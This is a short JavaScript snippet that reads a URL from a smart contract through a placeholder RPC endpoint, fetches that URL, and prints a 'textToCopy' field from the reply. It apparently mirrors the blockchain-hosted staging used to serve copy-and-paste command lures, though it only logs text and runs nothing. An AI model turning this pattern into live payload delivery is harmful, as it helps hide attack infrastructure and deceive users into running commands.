const ethers = require('ethers');
const axios = require('axios');
const provider = new ethers.JsonRpcProvider('https://rpc.example.invalid');
const contract = new ethers.Contract('0x1111111111111111111111111111111111111111', [
  'function getDomain() public view returns (string memory)',
], provider);

async function initialize() {
  const domainName = await contract.getDomain();
  const response = await axios.get(domainName);
  const { textToCopy } = response.data;
  if (textToCopy) console.log(textToCopy);
}
